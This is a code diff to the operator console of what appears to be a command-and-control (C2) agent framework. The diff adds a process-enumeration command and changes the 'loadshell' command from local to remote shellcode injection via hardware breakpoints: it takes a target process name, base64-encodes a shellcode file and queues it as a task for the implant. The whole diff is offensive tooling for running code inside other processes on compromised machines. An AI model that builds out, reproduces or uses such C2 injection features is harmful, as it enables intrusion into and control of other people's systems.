@@ -27,7 +27,8 @@ class Agent:
         
         try:
             self.menu = Menu(self.name)
-            self.menu.registerCommand("loadshell", "Local ShellCode Injection via HWBP", "<location of .bin>")
+            self.menu.registerCommand("enumproc", "Enumerate all running processes", "")
+            self.menu.registerCommand("loadshell", "Remote ShellCode Injection via HWBP", "<target process> <location of .bin>")
             self.menu.registerCommand("sleep", "Change agent's sleep time.", "<time (s)>")
             self.menu.registerCommand("clear", "Clear tasks.", "")
             self.menu.registerCommand("quit", "Task agent to quit.", "")
@@ -70,22 +71,38 @@ class Agent:
         
         return 0
     
+    def enumproc(self):
+        task = "enumproc"
+        self.writeTask(task)
+    
     def loadshell(self, args):
-        if len(args) != 1:
-            error("Invalid arguments.")
-        else:
-            binfile = args[0]
-            if not os.path.isfile(binfile):
-                error("File does not exist.")
-                return
+        if len(args) != 2:
+            error("Invalid arguments for loadshell. Please provide <target process> <location of .bin>.")
+            return
+        
+        target_process = args[0]
+        binfile = args[1]
 
-            try:
-                with open(binfile, "rb") as f:
-                    data = f.read()
-                task = "loadshell {}".format(base64.b64encode(data))
-                self.writeTask(task)
-            except Exception as e:
-                error(f"An error occurred while reading the file: {e}")
+        # Expand user home directory (~) and make relative paths absolute
+        binfile = os.path.abspath(os.path.expanduser(binfile))
+
+        print(f"Target Process: {target_process}")
+        print(f"Binary File: {binfile}\n")
+
+        if not os.path.isfile(binfile):
+            error("File does not exist.")
+            return
+
+        try:
+            with open(binfile, "rb") as f:
+                data = f.read()
+            encoded_data = base64.b64encode(data).decode('utf-8')
+            task = f"loadshell {target_process} {encoded_data}"
+            self.writeTask(task)
+            success("Loadshell task written successfully.")
+        except Exception as e:
+            error(f"An error occurred while reading the file: {e}")
+
 
     def sleep(self, args):
 
@@ -140,6 +157,8 @@ class Agent:
             home()
         elif command == "exit":
             Exit()
+        elif command == "enumproc":
+            self.enumproc()
         elif command == "loadshell":
             self.loadshell(args)
         elif command == "sleep":
@@ -159,23 +178,24 @@ class Agent:
                 print(f"Error parsing command: {e}")
                 continue
 
+            # Ignore empty input
+            if command is None or command == "":
+                continue
+
             if command not in self.Commands:
                 error("Invalid command.")
             else:
-                # Check if the command is 'sleep' and requires a numeric argument
+                # Handle commands as before
                 if command == "sleep":
                     if len(args) == 1 and args[0].isdigit():
                         self.ev(command, args)
                     else:
                         error("Invalid argument for sleep. Please provide a numeric value.")
-                
-                # Check if the command is 'loadshell' and requires a string argument
                 elif command == "loadshell":
-                    if len(args) == 1 and not args[0].isdigit():
+                    if len(args) == 2:
                         self.ev(command, args)
                     else:
-                        error("Invalid argument for loadshell. Please provide a filename.")
-
-                # Handle other commands
+                        error("Invalid arguments for loadshell. Please provide <target process> <location of .bin>.")
                 else:
                     self.ev(command, args)
+
